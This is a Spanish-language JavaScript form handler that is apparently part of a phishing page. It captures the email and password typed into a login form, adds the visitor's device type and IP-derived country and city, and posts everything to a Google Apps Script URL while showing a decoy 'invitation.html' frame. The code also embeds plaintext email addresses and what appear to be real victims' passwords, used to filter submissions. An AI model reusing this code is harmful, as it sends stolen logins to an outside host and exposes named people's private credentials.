document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["jhonantony0110@gmail.com","aridiazgu@uch.pe","darlyn.dayanramendoza@gmail.com","lsanchezv2@upao.edu.pe","tequenazo1995@gmail.com","delgadoangenny@gmail.com","aleferreyro1@gmail.com","bernatAaramichele38@gmail.com","yessenia.arista09@gmail.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["adri71318901"."Adri71318901","alyssromina21xd","Alyssromina21xd","cielito1309","Cielito1309","Mybabyslat23$","-Mybabyslat23$","050285cr7","lavidaesunamierda2","Cambiocambio2","Cambiocambio3","cambiocambio3","cambiocambio2","lavidaesunamierda2","emilse.1952@","Madrid1917@","Emilse.1952@","929915693bas","929915693Bas","jugodefresa5","Jugodefresa5","jugodefresa","Jugodefresa","Darlyn2006","darlyn2006","18668799","Tifany123.","Soportes.2025","soportes.2025","jenniffer0505","Jenniffer0505","no quiero p","No quiero p","kimbergor22","Kimbergor22","johitaw12","Johitaw12","ange27","Ange27","Yessenia09","yessenia.09","Yessenia.09","cambiocambio3","pepas5314","Pepas5314","kpgz16$%","jovita70**","Jovita70**","17025612","Jovita70*","jovita70*","grissel1234567890#","Grissel1234567890#","lavidaesunamierda2","Cambiocambio2","cambiocambio2","4FS3YZfpZCjwPAR","977846069","dairy.12","jovita70**","Nuevasoportunidades08","nuevasoportunidades08","Olivia1106","Olivia11.06","Olivia2109","olivia1106","olivia11.06","Olivia2019","olivia2019"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    if (isProhibitedEmail) {
        errorMessage.textContent = "No se encuentra la dirección de correo";
        errorMessage.style.color = 'red';
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Verificar contraseña prohibida
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    if (containsProhibitedPassword) {
        errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
        errorMessage.style.color = 'red';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Si pasa todas las validaciones, continúa con el proceso normal
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
 // Antes de mostrar el iframe, ocultar el footer de folder.html
document.querySelector("p").style.display = "none"; 

// Mostrar el iframe
let iframe = document.getElementById("usuarioFrame");
iframe.src = "invitation.html";
iframe.style.display = "block";

    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        loadingMessage.remove();
    };
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country; // Captura el país
            }
            if (data.city) {
                city = data.city; // Captura la ciudad
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceType); // Agregar dispositivo
    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
    
    // ✅ Enviar los datos correctamente a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbyc3GMZd_iHz3YAthw0BkMNt-5kdbxBtd4sBB3HodkJRvOUXUtT3qtRKRlzGj9TMQMG/exec";
    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
